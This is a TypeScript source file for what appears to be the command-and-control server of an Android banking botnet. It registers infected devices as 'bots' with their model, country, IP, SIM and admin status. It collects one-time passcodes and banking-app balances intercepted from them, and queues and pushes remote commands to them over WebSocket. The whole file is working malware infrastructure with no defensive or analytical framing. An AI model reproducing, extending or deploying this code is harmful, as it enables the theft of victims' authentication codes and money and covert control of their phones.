import { WebSocketServer, WebSocket } from 'ws';
import type { Server } from 'node:http';
import { config } from './config.js';
import { dbApi } from './database.js';
import type { C2Message } from './types.js';

const clients = new Map<string, WebSocket>();

export function attachWs(server: Server) {
  const wss = new WebSocketServer({ server, path: config.wsPath });
  wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
      let msg: C2Message;
      try { msg = JSON.parse(raw.toString()); } catch { return; }
      switch (msg.type) {
        case 'hello': {
          clients.set(msg.botId, ws);
          dbApi.upsertBot({
            id: msg.botId, model: msg.model, android: msg.android, country: msg.country,
            ip: msg.ip, online: true, lastSeen: Date.now(), battery: msg.battery,
            charging: msg.charging, admin: msg.admin, version: msg.version, sim: msg.sim, extra: '',
          });
          flushQueue(msg.botId, ws);
          break;
        }
        case 'hb': {
          clients.set(msg.botId, ws);
          dbApi.setOnline(msg.botId, true);
          if (msg.battery !== undefined) {
            const b = dbApi.getBot(msg.botId);
            if (b) dbApi.upsertBot({ ...b, battery: msg.battery, charging: !!msg.charging, online: true, lastSeen: Date.now() });
          }
          break;
        }
        case 'result':
          msg.ok ? dbApi.markDone(msg.cmdId, msg.data) : dbApi.markFailed(msg.cmdId, msg.data);
          break;
        case 'log': dbApi.addLog(msg.botId, msg.level, msg.msg); break;
        case 'otp': dbApi.addLog(msg.botId, 'otp', `${msg.app}: ${msg.code}`); break;
        case 'balance': dbApi.addLog(msg.botId, 'balance', `${msg.app}: ${msg.balance}`); break;
        case 'metrics': dbApi.addLog(msg.botId, 'metrics', msg.payload); break;
      }
    });
    ws.on('close', () => {
      for (const [id, w] of clients) if (w === ws) { clients.delete(id); dbApi.setOnline(id, false); }
    });
  });

  setInterval(() => {
    const cutoff = Date.now() - config.heartbeatTimeoutMs;
    for (const [id, w] of clients) {
      const b = dbApi.getBot(id);
      if (b && b.lastSeen < cutoff) {
        try { w.close(); } catch { /* ignore */ }
        clients.delete(id);
        dbApi.setOnline(id, false);
      }
    }
  }, 15_000);
}

/** Queue a command (persisted), push immediately if bot connected. */
export function sendToBot(botId: string, cmd: string, args = ''): boolean {
  const rec = dbApi.queueCmd(botId, cmd, args);
  return sendQueued(botId, rec.id);
}

/** Deliver one queued command over WS; false = offline → stays queued for next hello/hb. */
export function sendQueued(botId: string, cmdId: number): boolean {
  const ws = clients.get(botId);
  if (!ws || ws.readyState !== WebSocket.OPEN) return false;
  const c = dbApi.queued(botId).find(x => x.id === cmdId);
  if (!c) return false;
  ws.send(JSON.stringify({ type: 'cmd', cmdId: c.id, cmd: c.cmd, args: c.args }));
  dbApi.markSent(cmdId);
  return true;
}

function flushQueue(botId: string, ws: WebSocket) {
  for (const c of dbApi.queued(botId)) {
    ws.send(JSON.stringify({ type: 'cmd', cmdId: c.id, cmd: c.cmd, args: c.args }));
    dbApi.markSent(c.id);
  }
    }
